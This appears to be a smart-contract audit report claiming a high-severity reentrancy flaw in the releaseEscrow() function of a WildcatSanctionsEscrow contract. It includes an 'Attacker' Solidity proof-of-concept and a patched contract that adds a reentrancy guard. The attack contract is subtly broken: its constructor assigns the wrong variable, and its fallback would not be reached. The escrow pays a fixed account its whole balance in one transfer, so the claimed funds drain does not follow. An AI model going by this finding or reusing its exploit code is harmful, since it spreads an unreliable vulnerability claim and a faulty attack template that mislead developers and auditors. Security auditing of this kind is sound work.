# Vulnerability details

## Impact
Detailed description of the impact of this finding.
Title: WildcatSanctionsEscrow contract has External Call to User-Supplied Address in releaseEscrow function
•	Severity: High
•	Impact: The vulnerability allows a reentrant contract or user-supplied address to maliciously re-enter the releaseEscrow() function or other functions in the contract.
•	Status: Unresolved
•	File: WildcatSanctionsEscrow.sol
•	Lines Affected: 34-44

Contract: WildcatSanctionsEscrow
Function: releaseEscrow()
PC Address: 1224
Estimated Gas Usage: 5,589 - 110,103

The releaseEscrow() function in the WildcatSanctionsEscrow contract makes an external call to transfer funds using the LibERC20.safeTransfer() method, which executes the following low-level call:
```sol
call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
```

This call sends a user-specified token to the account address. Since this is an external call to a user-supplied address, there is a potential for reentrancy, where the account or the token contract could execute malicious code, leading to reentering the releaseEscrow() function or other parts of the contract.

The vulnerability allows a reentrant contract or user-supplied address to maliciously re-enter the releaseEscrow() function or other functions in the contract. This can lead to:
```txt
Funds Drain: 
The reentrant contract could repeatedly call releaseEscrow() to withdraw multiple times before the escrow balance is updated, resulting in a loss of funds.

State Corruption: 
Unintended changes to the contract state during a reentrancy attack can corrupt the system’s logic or lock funds in the escrow.
```

```sol
pragma solidity ^0.8.0;

import "2024-08-wildcat/src/interfaces/IERC20.sol";
import "./WildcatSanctionsEscrow.sol";

contract Attacker {
    WildcatSanctionsEscrow public target;
    IERC20 public token;
    address public owner;

    constructor(address _target, address _token) {
        target = WildcatSanctionsEscrow(_target);
        token = IERC20(token);
        owner = msg.sender;
    }

    // Fallback function that re-enters releaseEscrow during the transfer
    fallback() external payable {
        if (token.balanceOf(address(target)) > 0) {
            target.releaseEscrow();
        }
    }

    // Start the attack
    function attack() external {
        require(msg.sender == owner, "Only owner can attack");
        target.releaseEscrow();
    }

    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = token.balanceOf(address(this));
        token.transfer(owner, balance);
    }
}
```

## Recommended Mitigation Steps
Below is an implementation using a Reentrancy Guard to prevent reentrant calls.
```sol
// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.20;

import "./IERC20.sol";
import "./IWildcatSanctionsEscrow.sol";
import "./IWildcatSanctionsSentinel.sol";
import "./LibERC20.sol";

contract WildcatSanctionsEscrow is IWildcatSanctionsEscrow {
    using LibERC20 for address;

    bool private _reentrancyGuard;

    address public immutable override sentinel;
    address public immutable override borrower;
    address public immutable override account;
    address internal immutable asset;

    modifier nonReentrant() {
        require(!_reentrancyGuard, "Reentrancy detected");
        _reentrancyGuard = true;
        _;
        _reentrancyGuard = false;
    }

    constructor(address _sentinel) {
        sentinel = _sentinel;
        (borrower, account, asset) = IWildcatSanctionsSentinel(sentinel).tmpEscrowParams();
    }

    function balance() public view override returns (uint256) {
        return IERC20(asset).balanceOf(address(this));
    }

    function canReleaseEscrow() public view override returns (bool) {
        return !IWildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);
    }

    function escrowedAsset() public view override returns (address, uint256) {
        return (asset, balance());
    }

    function releaseEscrow() public override nonReentrant {
        if (!canReleaseEscrow()) revert CanNotReleaseEscrow();

        uint256 amount = balance();
        address _account = account;
        address _asset = asset;

        asset.safeTransfer(_account, amount);

        emit EscrowReleased(_account, _asset, amount);
    }
}
```
